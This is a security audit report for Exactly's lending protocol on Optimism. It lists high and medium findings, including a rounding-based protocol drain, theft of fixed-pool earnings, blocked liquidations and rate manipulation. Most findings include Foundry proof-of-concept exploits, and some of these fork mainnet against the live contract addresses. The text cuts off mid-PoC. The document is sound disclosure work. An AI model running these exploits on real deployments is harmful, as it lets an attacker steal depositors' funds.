# Issue H-1: The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/41 

## Found by 
0x73696d616f, BoRonGod, Ward, kankodu, santipu\_
## Summary
- When the totalSupply of a market is 0, an attacker can take advantage of #1 and #2 to drain the entire protocol.

## Vulnerability Detail
- The attacker inflates the value of 1 share to a large value, making it sufficient to borrow all the borrowable assets using stealth donation as described in #1 using the original account.
- They create a throwAway account and mint 1 wei of share to that account as well.
  - They put up this 1 wei of share as collateral, borrow all the available assets, and transfer them to the original account.
  - Abandon the market by withdrawing only 1 wei of asset which is allowed, because 1 wei of asset won't be enough to make the position unhealthy (checked using `auditor.shortfall` at the start of the withdrawal). However, this results in 1 whole wei of share (worth a large value) being burnt due to rounding up. See #2.
  - As a result, the throwaway account will now have 0 collateral and a lot of debt.
- The original account now has the claim to all the assets as they are the only holder of shares. Since the original account never borrowed, they are able to withdraw all the assets. Additionally, they receive all the borrowed assets that the throwaway account sent to it.

## Impact
- If the totalSupply of a market is 0, the whole protocol can be drained.

## Code Snippet
- https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L726

##POC
- Add below testcase in `test/Market.t.sol`
```solidity

contract ThrowAwayAccount {
  function enterMarketAndBorrow(Market exactlyMarketToEnter, Market exactlyMarketToBorrowFrom) public {
    exactlyMarketToEnter.auditor().enterMarket(exactlyMarketToEnter);

    //borrow all the available assets
    exactlyMarketToBorrowFrom.borrow(3000 ether, msg.sender, address(this));

    //abandon the market by withdrawing only 1 wei of asset
    //this is allowed because 1 wei of asset won't be enough to make postion unhealthy (checked using auditor.shortfall at the start in withdraw)
    //but results in 1 whole wei of share (worth 8000 ether) being burnt due to rounding up
    exactlyMarketToEnter.withdraw(1, address(this), address(this));

    //This market will be underwater after that since the 1 wei they deposited as collateral has now been burnt
  }
}

 function testDrainProtocol() external {
    marketWETH.asset().transfer(BOB, 3000 ether);
    //this is the deposit that will be stolen later on
    vm.prank(BOB);
    marketWETH.deposit(3000 ether, BOB);

    //These are attacker's interactions that uses DAI market which has 0 totalSupply to drain the protocol (BOB's 3000 ether in this case)
    uint256 wETHBalanceBefore = marketWETH.asset().balanceOf(address(this));
    uint256 assetBalanceBefore = market.asset().balanceOf(address(this));
    //require that the total Supply is zero
    require(market.totalSupply() == 0, "totalSupply is not zero");

    //enter the market
    market.auditor().enterMarket(market);

    //make a small deposit
    market.deposit(0.01 ether, address(this));
    //borrow even smaller amount
    uint256 borrowShares = market.borrow(0.005 ether, address(this), address(this));

    //wait for 1 block which is enough so that atleast 1 wei is accured as interest
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 10 seconds);

    //deposit a few tokens to accure interest
    market.deposit(2, address(this));

    //repay all the debt
    market.refund(borrowShares, address(this));

    //redeem all but 1 wei of the deposit
    uint256 shares = market.balanceOf(address(this));
    market.redeem(shares - 1, address(this), address(this));

    require(market.totalAssets() == 2 && market.totalSupply() == 1, "starting conditions are not as expected");

    uint256 desiredPricePerShare = 8000 ether;
    // The loop to inflate the price
    while (true) {
      uint256 sharesReceived = market.deposit(market.totalAssets() * 2 - 1, address(this));
      require(sharesReceived == 1, "sharesReceived is not 1 as expected"); //this should have been 1.99999... for larger values of i but it is rounded down to 1

      if (market.totalAssets() > desiredPricePerShare) break;

      uint256 sharesBurnt = market.withdraw(1, address(this), address(this));
      require(sharesBurnt == 1, "sharesBunrt is not 1 as expected"); //this should have been ~0.0000001 for larger values of i but it is rounded up to 1
    }

    uint256 sharesBurnt = market.withdraw(market.totalAssets() - desiredPricePerShare, address(this), address(this));
    require(sharesBurnt == 1, "sharesBunrt is not 1 as expected");

    require(
      market.totalAssets() == desiredPricePerShare && market.totalSupply() == 1, "inflating the price was unsuccessful"
    );

    ThrowAwayAccount throwAwayAccount = new ThrowAwayAccount();

    //mint 1 wei of share (worth 8000 ether) to the throwaway account
    market.mint(1, address(throwAwayAccount));
    //throwAwayAccount puts up 1 wei of share as collateral, borrows all available assets and then withdraws 1 wei of asset
    throwAwayAccount.enterMarketAndBorrow(market, marketWETH);

    //this throwaway account now has a lot of debt and no collateral to back it
    (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(throwAwayAccount), Market(address(0)), 0);
    assertEq(collateral, 0);
    assertGt(debt, 3000 ether);

    //attacker gets away with everything
    market.withdraw(market.totalAssets(), address(this), address(this));

    assertEq(market.asset().balanceOf(address(this)), assetBalanceBefore - 1); //make sure attacker gets back all their assets
    //in addtion they get the borrowed assets for free
    assertEq(marketWETH.asset().balanceOf(address(this)), wETHBalanceBefore + 3000 ether);
  }
```
## Tool used
Manual Review

## Recommendation
- Fix #1 and #2 

# Issue H-2: Theft of unassigned earnings from a fixed pool 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/68 

## Found by 
ether\_sky, santiellena, santipu\_
## Summary

An attacker can borrow a dust amount from a fixed pool to round down the fee to zero, repeating this thousands of times the attacker will get a big fixed loan with 0 fees. If that loan is repaid early, the amount repaid will be lower than the borrowed amount, effectively stealing funds from the unassigned earnings of that fixed pool.

## Vulnerability Detail

When a user takes a loan from a fixed pool, the resulting fee is rounded down. An attacker can use this feature to borrow a dust amount from a fixed pool thousands of times to end up with a big fixed loan with 0 fees. 

The fee is calculated here:

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L320
```solidity
fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));
```

When the borrowed assets are really low, the resulting fee will be rounded down to zero. This by itself is already an issue, but an attacker can use this loan to steal funds from the unassigned earnings.

When a fixed loan is repaid early, it can get a discount that is calculated as if the repaid amount was deposited into that fixed pool. The discount depends on the unassigned earnings of the pool and the proportion that the repaid amount represents in the total fixed debt backed by the floating pool.

When the attacker repays this loan with no interest, he's going to get a discount based on the current unassigned earnings of that pool. This discount will make the attacker repay less funds than he originally borrowed, and those funds will be subtracted from the unassigned earnings of that pool.

## Impact

An attacker can steal the unassigned earnings from a fixed pool. 

## PoC

The following PoC executes this attack on the live contracts of Exactly in the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:

```solidity
forge test --match-test test_steal_unassigned_earnings --evm-version cancun
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Market} from "protocol/contracts/Market.sol";
import {FixedLib} from "protocol/contracts/utils/FixedLib.sol";
import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TestMarket is Test {
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    Market marketWBTC = Market(0x6f748FD65d7c71949BA6641B3248C4C191F3b322);

    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 wbtc = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);

    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_steal_unassigned_earnings() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = 1722470400; // Aug 01
        uint256 liquidity = 100_000e6;
        uint256 borrowAmount = 1e8;

        // Simulate some fixed rate borrows on the WBTC market
        deal(address(usdc), address(this), liquidity);
        usdc.approve(address(marketUSDC), liquidity);
        marketUSDC.deposit(liquidity, address(this));
        marketUSDC.auditor().enterMarket(marketUSDC);
        marketWBTC.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );

        // Attacker deposits liquidity and borrows from the same pool
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        deal(address(wbtc), attacker, 1e8);
        wbtc.approve(address(marketWBTC), type(uint256).max);
        marketWBTC.deposit(1e8, attacker);

        // Attacker borrows a tiny amount to round the fee to 0
        // Doing it lots of times you end up with a big loan with a fee of 0
        for (uint i = 0; i < 20_000; i++) {
            marketWBTC.borrowAtMaturity(
                maturity,
                190,
                type(uint256).max,
                attacker,
                attacker
            );
        }

        (uint256 principal, uint256 fee) = marketWBTC.fixedBorrowPositions(
            maturity,
            attacker
        );

        assertEq(principal, 0.038e8); // Loan of 0.038 WBTC (~2400 USD)
        assertEq(fee, 0);

        // Repay all the loan
        uint256 actualRepayAssets = marketWBTC.repayAtMaturity(
            maturity,
            type(uint256).max,
            type(uint256).max,
            attacker
        );

        assertEq(actualRepayAssets, 0.03786283e8); // Repay 0.037 WBTC

        assertGt(principal, actualRepayAssets); // The attacker has repaid the loan of 0.038 WBTC with 0.037 WBTC
    }
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L320

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to not allow borrows with 0 fees from fixed pools. Here is a possible implementation of the fix:

```diff
    fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));
+   require(fee > 0);
```

# Issue H-3: DoS on liquidations when utilization rate is high 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/70 

## Found by 
0x73696d616f, santipu\_
## Summary

When a position is liquidated, the liquidator seizes some (or all) of the borrower's assets in compensation for repaying the unhealthy debt. However, when the utilization rate is high in a market, liquidations won't work because of insufficient protocol liquidity.

An attacker could use this bug to frontrun a liquidation transaction by withdrawing assets from a market, bringing the utilization higher and preventing the liquidation. 

## Vulnerability Detail

In liquidation, one of the last steps is to seize the assets from a borrower and give them to the liquidator. The `seize` function calls `internalSeize` to seize the assets from the borrower: 

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L678-L694
```solidity
  function internalSeize(Market seizeMarket, address liquidator, address borrower, uint256 assets) internal {
    if (assets == 0) revert ZeroWithdraw();

    // reverts on failure
    auditor.checkSeize(seizeMarket, this);

    RewardsController memRewardsController = rewardsController;
    if (address(memRewardsController) != address(0)) memRewardsController.handleDeposit(borrower);
    uint256 shares = previewWithdraw(assets);
>>  beforeWithdraw(assets, shares);
      
    // ...
  }
```

The function `internalSeize`, in turn, calls `beforeWithdraw` to update the state of the market before the actual seizing of the assets. The issue is that `beforeWithdraw` checks if the protocol has enough liquidity for the withdrawal of assets:

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L698-L706
```solidity
  function beforeWithdraw(uint256 assets, uint256) internal override whenNotPaused {
    updateFloatingAssetsAverage();
    depositToTreasury(updateFloatingDebt());
    uint256 earnings = accrueAccumulatedEarnings();
    uint256 newFloatingAssets = floatingAssets + earnings - assets;
    // check if the underlying liquidity that the account wants to withdraw is borrowed
>>  if (floatingBackupBorrowed + floatingDebt > newFloatingAssets) revert InsufficientProtocolLiquidity();
    floatingAssets = newFloatingAssets;
  }
```

This check will make the whole liquidation revert when the utilization rate of that market is near the top. An attacker can use this bug to prevent a liquidation of one of his accounts by frontrunning the liquidation and withdrawing liquidity with another account. When that liquidity is withdrawn, the actual liquidation will fail. 

## Impact

When the utilization rate of a market is high, the liquidations will fail, causing bad debt on the protocol if the price moves against the borrower. Liquidations are a core invariant of any lending protocol and should never fail in order to prevent bad debt, and ultimately, a bank run. 

An attacker can use this vulnerability to make his positions not liquidatable by frontrunning a liquidation and withdrawing liquidity from that market with another account. 

## PoC

The following PoC can be pasted in the `Market.t.sol` file and can be run with the following command `forge test --match-test test_fail_liquidation`.

```solidity
function test_fail_liquidation() external {
    // We set the price of the asset to 0.0002 (1 ETH = 5,000 DAI)
    daiPriceFeed.setPrice(0.0002e18);

    // Simulate deposits on the markets
    market.deposit(50_000e18, ALICE);
    marketWETH.deposit(10e18, address(this));

    // Simulate borrowing on the markets
    vm.startPrank(ALICE);
    market.auditor().enterMarket(market);
    marketWETH.borrow(5e18, ALICE, ALICE);
    vm.stopPrank();

    market.borrow(35_000e18, address(this), address(this));

    // Price falls to 0.00025 (1 ETH = 4,000 DAI)
    daiPriceFeed.setPrice(0.00025e18);

    // Position cannot be liquidated due to insufficient protocol liquidity
    vm.prank(BOB);
    vm.expectRevert(InsufficientProtocolLiquidity.selector);
    market.liquidate(address(this), type(uint256).max, marketWETH);
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L704

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to not call `beforeWithdraw` in a liquidation and add the logic of `beforeWithdraw` in the `internalSeize` function except for the liquidity check.

# Issue H-4: Unassigned pool earnings can be stolen when a maturity borrow is liquidated by depositing at maturity with 1 principal 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/114 

## Found by 
00xSEV, 0x73696d616f, Trumpero, ether\_sky
## Summary

When a borrowed maturity is liquidated, `canDiscount` in `Market::noTransferRepayAtMaturity()` is `false`, which ignores the unassigned earnings. Thus, an attacker may borrow and deposit at maturity with a principal of 1 and get all these unassigned rewards.

## Vulnerability Detail

On `Market::liquidate()`, borrowed maturities will be liquidated first by calling `Market::noTransferRepayAtMaturity()`, passing in the `canDiscount` variable as `false`, so unassigned earnings in the pool will not be converted to `earningsAccumulator` and subtracted to `actualRepayAssets`. Following the liquidation, these unassigned earnings will be converted over time to `floatingAssets`, in `pool.accrueEarnings(maturity);` on deposit, borrow and repay maturities. Or, in case `floatingBackupBorrowed > 0`, the next user to deposit a maturity will partially or fully claim the fee, depending on how much deposit they supply. In case `floatingBackupBorrowed == 0`, and `supply` is 0, the user may borrow at maturity 1 principal and then deposit at maturity 1 principal, claiming the full fee. If `supply` is not 0, the user would have to borrow at maturity until the borrow amount becomes bigger than the supply, which would be less profitable (depending on the required borrowed), but still exploitable.

The following POC added to test `Market.t.sol` shows how an attacker can claim a liquidated borrowed maturity fee with just 1 principal of deposit.
```solidity
function test_POC_stolenBorrowedMaturityEarnings() public {
  uint256 maturity = FixedLib.INTERVAL;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, assets);

  vm.startPrank(ALICE);

  // ALICE deposits
  market.deposit(assets, ALICE);

  // ALICE borrows at maturity, using backup from the deposit
  market.borrowAtMaturity(maturity, assets/10, type(uint256).max, ALICE, ALICE);

  // ALICE borrows the maximum possible using floating rate
  (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(ALICE), Market(address(0)), 0);
  uint256 borrow = (collateral - debt)*8/10; // max borrow capacity
  market.borrow(borrow, ALICE, ALICE);

  vm.stopPrank();

  skip(1 days);

  // LIQUIDATOR liquidates ALICE, wiping ALICE'S maturity borrow
  // and ignores its unassigned rewards
  address liquidator = makeAddr("liquidator");
  vm.startPrank(liquidator);
  deal(address(asset), liquidator, assets);
  asset.approve(address(market), assets);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ATTACKER deposits to borrow at maturity
  address attacker = makeAddr("attacker");
  deal(address(asset), attacker, 20);
  vm.startPrank(attacker);
  asset.approve(address(market), 20);
  market.deposit(10, attacker);

  // ATTACKER borrows at maturity, making floatingBackupBorrowed = 1 > supply = 0
  market.borrowAtMaturity(maturity, 1, type(uint256).max, attacker, attacker);

  // ATTACKER deposits just 1 at maturity, claiming all the unassigned earnings
  // by only providing 1 principal
  uint256 positionAssets = market.depositAtMaturity(maturity, 1, 0, attacker);
  assertEq(positionAssets, 6657534246575341801);
}
```

## Impact

Attacker steals the unassigned earnings from the liquidation of a borrowed maturity with 1 principal.

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L244
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L293
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L375
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478
https://github.com/sherlock-aaccrueudit/2024-04-interest-rate-model-0x73696d616f/blob/main/protocol/contracts/Market.sol#L508
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L565
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/utils/FixedLib.sol#L84

## Tool used

Manual Review

Vscode

Foundry

## Recommendation

Instead of ignoring unassigned earnings on liquidations, convert them to `earningsAccumulator`, which should not be able to be gamed as it goes through an over time accumulator.



## Discussion

**santipu03**

@itofarina @cruzdanilo 
Could you add also the `will fix`/`won't fix` tag?

**santipu03**

@santichez Could you add the `will fix` or `won't fix` tag?

# Issue M-1: Bad debt isn't cleared when `earningsAccumulator` is lower than a fixed-pool bad debt 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/66 

## Found by 
mahdikarimi, santipu\_
## Summary

When the bad debt from a fixed pool must be cleared but the `earningsAccumulator` value is slightly lower than the debt, it won't clear any amount of debt. If the bad debt amount is big enough, this may cause a bank run, and the last users to withdraw won't be able to because of this uncleared bad debt. 

## Vulnerability Detail

When a loan is liquidated and it has more debt than collateral, that extra debt (bad debt) must be cleared at the end of the liquidation to avoid a discrepancy between the tracked funds and the actual funds. The function in charge of clearing the bad debt is the following:

```solidity

    function clearBadDebt(address borrower) external {
        if (msg.sender != address(auditor)) revert NotAuditor();

        floatingAssets += accrueAccumulatedEarnings();
        Account storage account = accounts[borrower];
        uint256 accumulator = earningsAccumulator;
        uint256 totalBadDebt = 0;
        uint256 packedMaturities = account.fixedBorrows;
        uint256 maturity = packedMaturities & ((1 << 32) - 1);
        packedMaturities = packedMaturities >> 32;
        while (packedMaturities != 0) {
          if (packedMaturities & 1 != 0) {
            FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];
            uint256 badDebt = position.principal + position.fee;
>>          if (accumulator >= badDebt) {
              RewardsController memRewardsController = rewardsController;
              if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);
              accumulator -= badDebt;
              totalBadDebt += badDebt;
              floatingBackupBorrowed -= fixedPools[maturity].repay(position.principal);
              delete fixedBorrowPositions[maturity][borrower];
              account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);

              emit RepayAtMaturity(maturity, msg.sender, borrower, badDebt, badDebt);
            }
          }
          packedMaturities >>= 1;
          maturity += FixedLib.INTERVAL;
        }
        
        // ...
    }
```

The `clearBadDebt` function first clears the bad debt on the fixed pools using the `earningsAccumulator` on the market. However, when the accumulator is slightly lower than the bad debt on a fixed pool, it should clear the maximum debt possible but it won't clear any bad debt. 

Imagine the following scenario:
1. After a loan is liquidated and the full collateral is seized, it still has 1 ETH (`1e18`) of debt in a fixed pool. 
2. When `clearBadDebt` is called, the earnings accumulator has 0.95 ETH (`0.95e18`) in it, which is less than the bad debt to be cleared.
3. The function, instead of clearing the maximum bad debt possible (i.e. 0.95 ETH), it won't clear any bad debt because the accumulator is slightly lower than the debt to clear. 

This will cause the accrued bad debt to stay in the market, possibly causing a bank run in the long term if enough bad debt isn't cleared. 

## Impact

When the value of `earningsAccumulator` is slightly lower than the bad debt, the protocol won't clear any bad debt. If this happens enough times, the uncleared bad debt will become bigger and it will possibly cause a bank run in the future, and the last users to withdraw won't be able to because of the lack of funds within the protocol. 

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L633

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to clear the maximum amount of bad debt possible when the accumulated earnings are slightly lower than the bad debt to clear. 

# Issue M-2: Fixed interest rates can be manipulated by a whale borrower 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/67 

## Found by 
santipu\_
## Summary

A whale borrower can manipulate the fixed interest rate by repaying a huge amount of funds, taking a fixed loan, and borrowing the funds previously repaid.

## Vulnerability Detail

The fixed interest rate is calculated based on the utilization rates in that market, the higher the utilization, the higher the fixed rate. A whale borrower can manipulate the fixed rate in just one block by repaying a huge loan, taking a fixed loan with a lower rate, and borrowing the loan previously repaid again. 

When borrowing from a fixed pool, the fixed interest rate is calculated here: 

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L313-L319
```solidity
  uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();
  uint256 memFloatingDebt = floatingDebt;
  uint256 fixedRate = interestRateModel.fixedRate(
    maturity,
    maxFuturePools,
    fixedUtilization(pool.supplied, pool.borrowed, memFloatingAssetsAverage),
    floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),
    globalUtilization(memFloatingAssetsAverage, memFloatingDebt, floatingBackupBorrowed)
  );
```

To calculate the utilization of the market, we use the average of the total assets, this is to prevent the manipulation of the rate by depositing and withdrawing in the same block. However, the floating debt used to calculate the utilization is not an average, but just the current value. This will allow an attacker to manipulate the total debt in just one block, lowering the fixed rate. 

## Impact

A whale borrower can manipulate the fixed interest rate by repaying a huge amount of funds, taking a fixed loan with a lower rate, and borrowing the funds previously repaid again. 

## PoC

The following PoC executes this attack on the live contracts of Exactly on the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:

```solidity
forge test --match-test test_manipulate_utilization_lower_rate --evm-version cancun
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Market} from "protocol/contracts/Market.sol";
import {FixedLib} from "protocol/contracts/utils/FixedLib.sol";
import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TestManipulationRate is Test {
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    Market marketWSTETH = Market(0x22ab31Cd55130435b5efBf9224b6a9d5EC36533F);

    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 wsteth = IERC20(0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb);

    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_manipulate_utilization_lower_rate() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = 1729728000; // Latest maturity
        uint256 liquidity = 3e18;
        uint256 borrowAmount = 1e18;

        // Simulate that a whale has borrowed a lot from the wstETH market
        address whale = makeAddr("whale");
        vm.startPrank(whale);
        deal(address(usdc), whale, 5_000_000e6);
        usdc.approve(address(marketUSDC), type(uint256).max);
        marketUSDC.deposit(5_000_000e6, whale);
        marketUSDC.auditor().enterMarket(marketUSDC);

        for (uint i = 0; i < 35; i++) {
            marketWSTETH.borrow(20e18, whale, whale);
        }
        vm.stopPrank();

        uint256 snapshot = vm.snapshot();

        // Now, borrow from fixed pool and store the fee
        deal(address(wsteth), address(this), liquidity);
        wsteth.approve(address(marketWSTETH), liquidity);
        marketWSTETH.deposit(liquidity, address(this));
        marketWSTETH.auditor().enterMarket(marketWSTETH);
        marketWSTETH.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );
        (uint256 principal1, uint256 fee1) = marketWSTETH.fixedBorrowPositions(
            maturity,
            address(this)
        );

        // Reverse the borrow and decrease utilization first
        vm.revertTo(snapshot);
        vm.startPrank(whale);
        wsteth.approve(address(marketWSTETH), type(uint256).max);
        marketWSTETH.repay(700e18, whale);
        vm.stopPrank();

        // Borrow again from fixed pool and store the fee
        deal(address(wsteth), address(this), liquidity);
        wsteth.approve(address(marketWSTETH), liquidity);
        marketWSTETH.deposit(liquidity, address(this));
        marketWSTETH.auditor().enterMarket(marketWSTETH);
        marketWSTETH.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );
        (uint256 principal2, uint256 fee2) = marketWSTETH.fixedBorrowPositions(
            maturity,
            address(this)
        );

        // With the original utilization, the fee is higher
        assertEq(principal1, borrowAmount);
        assertEq(fee1, 0.582518181735455386e18); // The fee is ~58% of the borrow amount

        // After the utilization is manipulated, the fee is a LOT lower
        assertEq(principal2, borrowAmount);
        assertEq(fee2, 0.011389232448094875e18); // The fee is ~1% of the borrow amount
    }
}
```

**Note**: The attacker can get a flash loan to repay/borrow the huge variable loan to lower the fixed rate.

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L313-L319

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to use an average of the floating debt to calculate the fixed utilization rate. Implementing a mechanism similar to how the average of the total assets is calculated will prevent this attack from happening. 

# Issue M-3: Manipulation of the floating debt by updating `floatingBackupBorrowed` 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/72 

## Found by 
0x73696d616f, KupiaSec, Shield, santipu\_
## Summary

An attacker can update the variable `floatingBackupBorrowed` without updating the floating debt. This will change the utilization rate of the market without accruing the past floating debt, thus manipulating the unrealized debt, making it too high, and stealing funds from borrowers. 

## Vulnerability Detail

The floating interest rate directly depends on the utilization rate of the market, the higher the utilization, the higher the interest rate. Whenever the utilization rate of the market is updated, the floating debt must be accrued before. This is necessary to accrue all debt based on past utilization and not on the updated one to avoid manipulation. 

This behavior is correctly implemented whenever we update `floatingDebt` and `floatingAssets`. Before these two values are updated, the past floating debt is accrued, we can check it in the following functions:

- [deposit/mint](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L711)
- [withdraw/redeem](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L700)
- [borrow](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L150)
- [repay/refund](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L211)

However, the utilization rate on the market depends on one more value, and that is the `floatingBackupBorrowed`. The issue is that when this value is updated (in the fixed-pool functions), the floating debt is not updated first. This issue will cause that when the floating debt hasn't been updated in a while, an attacker can update the value of `floatingBackupBorrowed`, manipulating the previously accrued debt, making it higher or lower than it should be. 

Currently, 3 functions update the value of `floatingBackupBorrowed` without accruing the floating debt first:

1. `withdrawAtMaturity`
2. `repayAtMaturity`
3. `depositAtMaturity`

With the functions `repayAtMaturity` and `depositAtMaturity`, an attacker could deflate `floatingBackupBorrowed`, thus lowering the past accrued debt and making the borrowers of the floating pool pay less debt than they should. 

However, an attacker can also use the function `withdrawAtMaturity` to inflate `floatingBackupBorrowed`, thus artificially incrementing the past accrued debt and making the borrowers of the floating pool pay more debt than they should. This attack would be profitable for the lenders of the floating pool because they'd receive more funds from the borrowers. Moreover, this unexpected jump in the accrued debt could make some borrowers go underwater and get liquidated. 

## Impact

An attacker can call `withdrawAtMaturity` to inflate the value of `floatingBackupBorrowed` and artificially increment the accrued debt that the borrowers should pay lenders on the floating pool. This attack would profit the floating lenders while causing some borrowers to go into liquidation. 

## PoC

The following PoC executes this attack on the live contracts of Exactly in the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:

```solidity
forge test --match-test test_backup_borrowed --evm-version cancun
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { Market } from "protocol/contracts/Market.sol";
import { InterestRateModel } from "protocol/contracts/InterestRateModel.sol";
import { FixedLib } from "protocol/contracts/utils/FixedLib.sol";
import {Test, console2, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TestMarket is Test {

    Market marketOP = Market(0xa430A427bd00210506589906a71B54d6C256CEdb);
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);

    IERC20 optimism = IERC20(0x4200000000000000000000000000000000000042); 
    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);

    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_backup_borrowed() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = block.timestamp - (block.timestamp % 4 weeks) + 16 weeks;
        uint256 floatingLiquidity = 1_000_000e18;
        uint256 fixedLiquidity = 500_000e18;

        // Malicious user has deposited at variable rate on the OP market
        deal(address(optimism), address(this), floatingLiquidity);
        optimism.approve(address(marketOP), floatingLiquidity);
        marketOP.deposit(floatingLiquidity, address(this));
        marketOP.auditor().enterMarket(marketOP);

        vm.warp(block.timestamp + 2 weeks);

        // Simulate users borrowing from the OP market at fixed and floating rate
        address user = makeAddr("user");
        vm.startPrank(user);
        deal(address(usdc), user, 5_500_000e6);
        usdc.approve(address(marketUSDC), 5_500_000e6);
        marketUSDC.deposit(5_500_000e6, user);
        marketUSDC.auditor().enterMarket(marketUSDC);
        marketOP.borrowAtMaturity(maturity, 500_000e18, type(uint256).max, user, user);
        marketOP.borrow(500_000e18, user, user);
        vm.stopPrank();

        // Malicious user provides liquidity for the fixed pool
        deal(address(optimism), address(this), fixedLiquidity);
        optimism.approve(address(marketOP), fixedLiquidity);
        uint256 positionAssets = marketOP.depositAtMaturity(maturity, fixedLiquidity, 0, address(this));

        vm.warp(maturity - 1 days);

        uint256 floatingLiquidityBefore = marketOP.previewRedeem(marketOP.balanceOf(address(this)));

